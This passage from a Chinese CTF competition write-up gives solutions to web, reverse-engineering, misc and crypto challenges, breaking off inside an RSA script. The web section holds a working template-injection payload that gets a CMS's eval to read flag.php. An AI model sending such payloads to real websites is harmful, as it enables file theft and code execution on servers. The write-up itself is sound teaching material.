class="keyword">type</span>=:read&#123;haha:typename&#125;</span><br><span class="line"></span><br><span class="line">$typename=file(%27flag.php%27)&#125;</span><br></pre></td></tr></table></figure><p>这样content被替换为</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-film sea-text"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span></span><span class="template-variable">&#123;<span class="keyword">if</span>:readfile(%27flag.php%27)&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">small</span>&gt;</span>共有<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sea-text"</span>&gt;</span></span><span class="template-variable">&#123;end <span class="keyword">if</span>&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span>个影片 第<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sea-text"</span>&gt;</span></span><span class="template-variable">&#123;searchlist:page&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span>页<span class="tag">&lt;/<span class="name">small</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>正则过后$iar为</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [<span class="meta">0</span>] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [<span class="meta">0</span>] =&gt; &#123;<span class="keyword">if</span>:readfile(%<span class="number">27f</span>lag.php%<span class="number">27</span>)&#125;&lt;/a&gt; &lt;small&gt;共有&lt;span <span class="keyword">class</span>=<span class="string">"sea-text"</span>&gt;&#123;end <span class="keyword">if</span>&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="meta">1</span>] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [<span class="meta">0</span>] =&gt; readfile(%<span class="number">27f</span>lag.php%<span class="number">27</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="meta">2</span>] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [<span class="meta">0</span>] =&gt; &lt;/a&gt; &lt;small&gt;共有&lt;span <span class="keyword">class</span>=<span class="string">"sea-text"</span>&gt;</span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>然后$strIf被赋值为readfile(%27flag.php%27)</p><p>然后 @eval(“if(readfile(%27flag.php%27)) { $ifFlag=true;} else{ $ifFlag=false;}”);</p><p>readlfile输出flag</p><p>最终payload：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchnum=&#123;end <span class="keyword">if</span>&#125;&amp;content=<span class="symbol">&lt;search&gt;</span>&#123;<span class="keyword">if</span>&#123;hah<span class="variable">a:type</span>&#125;&lt;/<span class="built_in">search</span>&gt;&amp;<span class="built_in">type</span>=:<span class="keyword">read</span>&#123;hah<span class="variable">a:typename</span>&#125;&amp;typename=<span class="keyword">file</span>(%<span class="number">27</span>flag.php%<span class="number">27</span>)&#125;</span><br></pre></td></tr></table></figure><p><a href="https://p2.ssl.qhimg.com/t01a43546f5bc598ac5.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t01a43546f5bc598ac5.png" alt="img"></a></p><p>flag：UNCTF{5ee25610af306b625b4cadb4cb5fa24b}</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="666"><a href="#666" class="headerlink" title="666"></a>666</h3><p>逆向签到题，</p><p>主要函数</p><p><a href="https://p0.ssl.qhimg.com/t01acfae537b2029f57.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>然后找到一些关键值，再根据加密逻辑写解密脚本即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">exp：</span><br><span class="line"></span><br><span class="line">cipher=<span class="string">'''izwhroz""w"v.K".Ni'''</span></span><br><span class="line">key=<span class="number">0x12</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(cipher),<span class="number">3</span>):</span><br><span class="line">    flag+=chr((ord(cipher[i])^key)<span class="number">-6</span>)</span><br><span class="line">    flag+=chr((ord(cipher[i+<span class="number">1</span>])^key)+<span class="number">6</span>)</span><br><span class="line">    flag+=chr((ord(cipher[i+<span class="number">2</span>])^key)^<span class="number">6</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>得到flag：unctf{b666b666b}</p><h3 id="神奇的数组"><a href="#神奇的数组" class="headerlink" title="神奇的数组"></a>神奇的数组</h3><p><a href="https://p5.ssl.qhimg.com/t01b1b5242af8d6740b.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>打开主函数，读一下程序逻辑，结合大小端存储顺序。好的，flag就是checkbox里照抄。</p><p><a href="https://p2.ssl.qhimg.com/t01ea30e449f32cf1a9.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>flag：ad461e203c7975b35e527960cbfeb06c</p><h3 id="BabyXor"><a href="#BabyXor" class="headerlink" title="BabyXor"></a>BabyXor</h3><p>手动脱壳+动调，直接出flag23333</p><p><a href="https://p1.ssl.qhimg.com/t01243cb805fa8ffd23.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p><a href="https://p2.ssl.qhimg.com/t01e0f7ec207dfc09cb.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p><a href="https://p1.ssl.qhimg.com/t01f7bcda3fa207272c.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>flag：flag{2378b077-7d6e-4564-bdca-7eec8eede9a2}</p><h3 id="unctfeasyMaze"><a href="#unctfeasyMaze" class="headerlink" title="unctfeasyMaze"></a>unctfeasyMaze</h3><p>解法一：ida反汇编后程序逻辑就是对地图进行了两次初始化，然后就是正常走迷宫了</p><p>将断点设置在地图第二次初始化完成后，然后查看RSI的值</p><p><a href="https://p1.ssl.qhimg.com/t01737c26b1931378a3.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>7个一行排列</p><p><a href="https://p2.ssl.qhimg.com/t01e30cd9bab6cc1578.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>走完即可得到flag</p><p><a href="https://p4.ssl.qhimg.com/t01e559eb7eb446c594.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>flag：UNCTF{ssddwdwdddssaasasaaassddddwdds}</p><p>解法二：爆破</p><p>运行了程序后发现可以一步一步走，一旦走错就会报错</p><p>于是可以按位爆破，最多也就是试4*29次，很快的。。。（至少比misc那个走迷宫要快）</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="信号不好我先走了"><a href="#信号不好我先走了" class="headerlink" title="信号不好我先走了"></a>信号不好我先走了</h3><p>下载得到图片，看了十六进制没有隐藏东西，于是用神器Stegsolve试一波LSB</p><p><a href="https://p3.ssl.qhimg.com/t018175cd593a8bf85d.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t018175cd593a8bf85d.png" alt="img"></a></p><p>果然有东西，藏了一个zip包。</p><p>保存下来解压缩得到一个张跟之前一样的图片。</p><p>盲猜盲水印，工具一把梭，得到</p><p><a href="https://p1.ssl.qhimg.com/t012729ab73729c051f.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t012729ab73729c051f.png" alt="img"></a></p><p>flag：unctf{9d0649505b702643}</p><h3 id="亲爱的"><a href="#亲爱的" class="headerlink" title="亲爱的"></a>亲爱的</h3><p>原以为是mp3隐写，然而没有密码。</p><p>看十六进制数据发现有一个zip包在底下，</p><p>然后注释有提示</p><p>根据提示，和歌名，在qq音乐 海阔天空 李现 的评论区，在对应评论时间找到密码：真的上头</p><p>解压得到一张图片，看十六进制数据，底下隐写了一个word文档，</p><p>word打开，发现右下角有端倪，是图片一角，拖出来得到flag</p><p>（或者直接把word文档当zip打开，在word文件夹中的media文件夹中也有flag 的图片）</p><p><a href="https://p1.ssl.qhimg.com/t01b72be95beef42f94.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t01b72be95beef42f94.png" alt="img"></a></p><p>flag：UNCTF{W3L0v3Unctf}</p><h3 id="快乐游戏题"><a href="#快乐游戏题" class="headerlink" title="快乐游戏题"></a>快乐游戏题</h3><p>终于出现了签到题，玩游戏得flag</p><p><a href="https://p2.ssl.qhimg.com/t0169f0bdcad13d39a6.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t0169f0bdcad13d39a6.png" alt="img"></a></p><p>flag：UNCTF{c783910550de39816d1de0f103b0ae32}</p><h3 id="Happy-Puzzle"><a href="#Happy-Puzzle" class="headerlink" title="Happy Puzzle"></a>Happy Puzzle</h3><p>手撕PNG呗，提示里的RGB没管，400*400比较有用，</p><p>最基本的PNG组成：文件头，IHDR，IDAT（len(data)+’IDAT’+data+crc），IEND，和随处可见的crc32校验（这玩意儿坑惨我了）</p><p>用windows比较方便的是，crc不用算，用0占位即可，IEND也可以不用加</p><p>解题过程：</p><ol><li>随便找个PNG，拿到png文件头+IHDR的数据</li><li>改宽高</li><li>给所有data文件，前面接上len(data)，即00002800，IDAT，再给末尾加上00000000占crc32的位</li><li>做出26张图，看哪张图有图像，然后以此类推的再往后加data</li></ol><ul><li>结果：</li></ul><p><a href="https://p1.ssl.qhimg.com/t01ebe3f81bfa8ebd96.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>贴上半自动exp：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import <span class="built_in">os</span></span><br><span class="line">head=<span class="string">'89504e470d0a1a0a0000000d494844520000019000000190080200000000000000'</span></span><br><span class="line">idata=<span class="string">'0000280049444154'</span></span><br><span class="line">crc=<span class="string">"1bad748e"</span></span><br><span class="line">with <span class="built_in">open</span>(filename,<span class="string">"rb"</span>) as f:</span><br><span class="line">       data = f.<span class="built_in">read</span>().encode(<span class="string">"hex"</span>)</span><br><span class="line">rootdir = <span class="string">''</span></span><br><span class="line">list = <span class="built_in">os</span>.listdir(rootdir) </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="built_in">len</span>(list)):</span><br><span class="line">       <span class="built_in">path</span> = <span class="built_in">os</span>.<span class="built_in">path</span>.join(rootdir,list[i])</span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">os</span>.<span class="built_in">path</span>.isfile(<span class="built_in">path</span>) <span class="keyword">and</span> <span class="built_in">path</span>[<span class="number">-5</span>:]==<span class="string">'.data'</span>:</span><br><span class="line">              with <span class="built_in">open</span>(<span class="built_in">path</span>,<span class="string">"rb"</span>) as f:</span><br><span class="line">                     txt = f.<span class="built_in">read</span>()</span><br><span class="line">                     txt=data+idata+txt.encode(<span class="string">"hex"</span>)+crc</span><br><span class="line">              with <span class="built_in">open</span>(<span class="built_in">path</span>.replace(<span class="string">"puzzle"</span>,<span class="string">"puzzle2"</span>).replace(<span class="string">"data"</span>,<span class="string">"png"</span>),<span class="string">"wb"</span>) as f:</span><br><span class="line">                     f.<span class="built_in">write</span>(txt.decode(<span class="string">'hex'</span>))</span><br></pre></td></tr></table></figure><p>flag：ucntf{312bbd92c1b291e1827ba519326b6688}</p><h3 id="think"><a href="#think" class="headerlink" title="think"></a>think</h3><p>用python的匿名函数一句话制作出的题目</p><p><a href="https://p4.ssl.qhimg.com/t01005759a8be9dcc16.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t01005759a8be9dcc16.png" alt="img"></a></p><p>关键在这里，check函数判断checknum，如果checknum为1，就打印(<strong>print(‘Congratulation!’), (</strong>print(decrypt(key, encrypted)),猜测后面半部分就是flag</p><p>于是，直接运行代码，然后在IDLE里键入check(1)，得到flag</p><p><a href="https://p5.ssl.qhimg.com/t0115f99ae8df9d03eb.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t0115f99ae8df9d03eb.png" alt="img"></a></p><p>flag:flag{34a94868a8ad9ff82baadb326c513d40}</p><h3 id="Hidden-secret"><a href="#Hidden-secret" class="headerlink" title="Hidden secret"></a>Hidden secret</h3><p>下载拿到三个里面全是十六进制的文件</p><p>看到03 04 05 06 01 02</p><p>就意识到这三个是被去掉了50 4B的zip包的三段数据</p><p>用010editor拼接起来后得到一个压缩包，里面是一个图片</p><p>用010editor打开图片后底下藏了一个zip包</p><p>解压得到一串密文：”K&lt;jslc7b5’gBA&amp;]_5MF!h5+E.@IQ&amp;A%EExEzp\X#9YhiSHV#”</p><p>base全家桶走一遍，最后确定是base92</p><p><a href="https://p2.ssl.qhimg.com/t0183d046de0ef60b68.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>得到flag：unctf{cca1a567c3145b1801a4f3273342c622}</p><h3 id="EasyBox"><a href="#EasyBox" class="headerlink" title="EasyBox"></a>EasyBox</h3><p>nc连上后是个数独题，不过是非常规的，只需要行和列不重复即可</p><p>魔改了个大佬的脚本：<a href="https://blog.csdn.net/zonnin/article/details/78813698" target="_blank" rel="noopener">https://blog.csdn.net/zonnin/article/details/78813698</a></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line">from pwn import *</span><br><span class="line"><span class="built_in">context</span>.log_level='debug'</span><br><span class="line">sh = remote('<span class="number">101.71</span>.29.5',<span class="number">10011</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">content</span> = sh.recvuntil(<span class="string">"answer :\n"</span>)[<span class="number">339</span>:<span class="number">718</span>].replace(<span class="string">"\n"</span>,<span class="string">""</span>).<span class="built_in">split</span>(<span class="string">"+-+-+-+-+-+-+-+-+-+"</span>)</span><br><span class="line">sudoku=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">content</span>:</span><br><span class="line">    <span class="keyword">if</span> i!=<span class="string">""</span>:</span><br><span class="line">        sudoku.<span class="built_in">append</span>(i.replace(<span class="string">" "</span>,<span class="string">"0"</span>)[<span class="number">1</span>:-<span class="number">1</span>].<span class="built_in">split</span>(<span class="string">"|"</span>))</span><br><span class="line">#<span class="built_in">print</span> sudoku</span><br><span class="line"></span><br><span class="line">def find_index(s):</span><br><span class="line">    flag=list()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="built_in">row</span>=[]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">if</span> s[i][j]=='<span class="number">0</span>':</span><br><span class="line">                <span class="built_in">row</span>.<span class="built_in">append</span>(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">row</span>.<span class="built_in">append</span>(<span class="number">0</span>)</span><br><span class="line">        flag.<span class="built_in">append</span>(<span class="built_in">row</span>)</span><br><span class="line">    <span class="built_in">return</span> flag</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">def not_done(s):</span><br><span class="line">    <span class="built_in">return</span> True <span class="keyword">in</span> [<span class="number">0</span> <span class="keyword">in</span> r <span class="keyword">for</span> r <span class="keyword">in</span> s]</span><br><span class="line"></span><br><span class="line">def get_row(s, r):</span><br><span class="line">    <span class="built_in">return</span> s[r]</span><br><span class="line"></span><br><span class="line">def get_column(s, c):</span><br><span class="line">    <span class="built_in">return</span> [r[c] <span class="keyword">for</span> r <span class="keyword">in</span> s]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_possible(s, r, c):</span><br><span class="line">    <span class="built_in">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>) \</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> get_row(s, r) \</span><br><span class="line">                <span class="keyword">and</span> i <span class="keyword">not</span> <span class="keyword">in</span> get_column(s, c)]</span><br><span class="line"></span><br><span class="line">def go_around(s):</span><br><span class="line">    ans = []</span><br><span class="line">    <span class="keyword">for</span> index_r, r <span class="keyword">in</span> enumerate(s): #row_index <span class="keyword">and</span> <span class="built_in">row</span></span><br><span class="line">        <span class="built_in">row</span> = []</span><br><span class="line">        <span class="keyword">for</span> index_c, c <span class="keyword">in</span> enumerate(r): #each <span class="keyword">in</span> <span class="built_in">row</span></span><br><span class="line">            c=int(c)</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> == c:</span><br><span class="line">                maybe_ans = get_possible(s, index_r, index_c)</span><br><span class="line">                <span class="built_in">row</span>.<span class="built_in">append</span>(maybe_ans[<span class="number">0</span>] <span class="keyword">if</span> len(maybe_ans) == <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">row</span>.<span class="built_in">append</span>(c)</span><br><span class="line">        ans.<span class="built_in">append</span>(<span class="built_in">row</span>)</span><br><span class="line">    <span class="built_in">return</span> ans</span><br><span class="line"></span><br><span class="line">def print_sudoku(s, msg):</span><br><span class="line">    <span class="built_in">print</span> msg</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> s:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">" "</span>.<span class="built_in">join</span>([str(c) <span class="keyword">for</span> c <span class="keyword">in</span> r])</span><br><span class="line">    <span class="built_in">print</span> <span class="string">"*"</span>*<span class="number">18</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#print_sudoku(sudoku, <span class="string">"initializing..."</span>)</span><br><span class="line">FLAG=find_index(sudoku)</span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line">sudoku = go_around(sudoku)</span><br><span class="line">#print_sudoku(sudoku, <span class="string">"Round "</span>+ str(counter) + <span class="string">" :"</span>)</span><br><span class="line">#counter += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> not_done(sudoku):</span><br><span class="line">    sudoku = go_around(sudoku)</span><br><span class="line">    #print_sudoku(sudoku, <span class="string">"Round "</span>+ str(counter) + <span class="string">" :"</span>)</span><br><span class="line">   # counter += <span class="number">1</span></span><br><span class="line">answer=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">if</span> FLAG[<span class="number">0</span>][i] == <span class="number">1</span>:</span><br><span class="line">        answer+=str(sudoku[<span class="number">0</span>][i])+<span class="string">","</span></span><br><span class="line">answer=answer[:-<span class="number">1</span>]</span><br><span class="line">sh.sendline(answer)</span><br><span class="line">#<span class="built_in">print</span> answer</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    answer=<span class="string">""</span></span><br><span class="line">    sh.recvuntil(<span class="string">"answer :"</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">if</span> FLAG[i][j]==<span class="number">1</span>:</span><br><span class="line">           answer+=str(sudoku[i][j])+<span class="string">","</span></span><br><span class="line">    answer=answer[:-<span class="number">1</span>]</span><br><span class="line">    sh.sendline(answer)</span><br><span class="line">    #<span class="built_in">print</span> answer</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://p0.ssl.qhimg.com/t01085b7d87603dfcf5.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>得到flag：flag{b613e841e0822e2925376d5373cbfbc4}</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="不仅仅是RSA"><a href="#不仅仅是RSA" class="headerlink" title="不仅仅是RSA"></a>不仅仅是RSA</h3><p>下载附件得到五个文件，</p><p>两个音频文件，看波形图，是摩斯密码，解密得到c1,c2</p><p>两个pem文件，用openssh打开得到两个模n和相同的e</p><p>根据加密脚本得知两个n有公约数</p><p>所以已知e p q</p><p>基础rsa解密，</p><p>exp：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">def GCD(a, b):</span><br><span class="line"></span><br><span class="line">    while b:</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">    return a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c1=4314251881242803343641258350847424240197348270934376293792054938860756265727535163218661012756264314717591117355736219880127534927494986120542485721347351</span><br><span class="line">c2=485162209351525800948941613977942416744737316759516157292410960531475083863663017229882430859161458909478412418639172249660818299099618143918080867132349</span><br><span class="line"></span><br><span class="line">e=mpz(41221)</span><br><span class="line"></span><br><span class="line">n1=int('0xC461B3ED566F2D68583019170BDD5263D113BAECE3DEE6631F08A166376AC41FF5D4E90B3330E0FC26993E3B353F38F9B6B880DFBC5807636497561B7611047B',16)</span><br><span class="line"></span><br><span class="line">n2=int('0xA36E3A2A83FE2C1E33F285A08C3ECD36E377F4D9FFE828E2426D3ECED0A7F947631E932AEC327555511AC6D71E72686C1CB7DBBF3859A4D9A3D344FBF12A9553',16)</span><br><span class="line"></span><br><span class="line"><span class="comment">#q=GCD(n1,n2)</span></span><br><span class="line">q = mpz(95652716952085928904432251307911783641637100214166105912784767390061832540987)</span><br><span class="line">print n2/q</span><br><span class="line">p1 = mpz(107527961531806336468215094056447603422487078704170855072884726273308088647617)</span><br><span class="line">p2 = mpz(89485735722023752007114986095340626130070550475022132484632643785292683293897)</span><br><span class="line">assert p1*q==n1</span><br><span class="line">assert p2*q==n2</span><br><span class="line">d1 = invert(e,(p1-1)*(q-1))</span><br><span class="line">d2 